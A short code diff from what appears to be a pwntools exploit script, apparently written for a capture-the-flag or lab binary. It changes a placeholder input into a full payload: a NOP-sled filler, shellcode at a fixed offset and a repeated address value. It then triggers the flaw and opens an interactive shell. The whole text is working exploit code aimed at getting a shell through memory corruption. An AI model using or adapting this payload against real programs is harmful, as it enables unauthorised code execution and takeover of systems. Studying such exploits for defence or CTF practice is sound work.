@@ -100,11 +100,14 @@ def main():
 								
 			io_rdy(io)
 			
-			pay1 = '\x00'*21
-			app_input(io, p32(useful_int)+"ZZZ", 256)
+			pay1 = fit({40: shell_asm, 171: str(useful_int_p32)*2}, filler = '\x90', length = 190)
+			app_input(io, pay1, 4)
 			
 			buf = app_dump(io)
 			print("buf is: "+str(buf))
+			
+			app_impulse(io, "d")
+			io.interactive()
 			
 			stage = stage + 1
 		else:
